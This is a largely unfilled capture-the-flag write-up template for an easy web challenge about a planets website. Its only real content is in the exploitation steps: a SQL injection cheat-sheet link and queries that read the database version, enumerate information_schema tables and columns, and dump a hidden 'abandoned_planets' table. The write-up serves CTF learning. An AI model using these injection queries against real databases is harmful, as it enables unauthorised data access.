# Challenge Name - CTF Name
## Challenge Info
- Date: YYYY-MM-DD
- CTF Name:
- Category: web
- Difficulty (subjective): easy
- Points:
- Provided Files:
- tools:
## Brief Description
I just started programming and created my first website, an overview of all the planets in our solar system. Can you check if I didn't leave any security issues in it?
## Initial Analysis
### Environment
### Code
## Vulnerability
## Exploit
### Strategy
### Exploitation Steps
``` 
https://portswigger.net/web-security/sql-injection/cheat-sheet
```

``` 
query=SELECT @@version
```

``` 
query=SELECT name, description FROM planets UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;
```

```
query=SELECT description FROM planets UNION SELECT COLUMN_NAME FROM information_schema.COLUMNS
```

``` 
query=SELECT * FROM abandoned_planets
```

### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
### payload
``` python
from pwn import *
```
## Lessons Learned
## Mitigation Strategies(Remediation)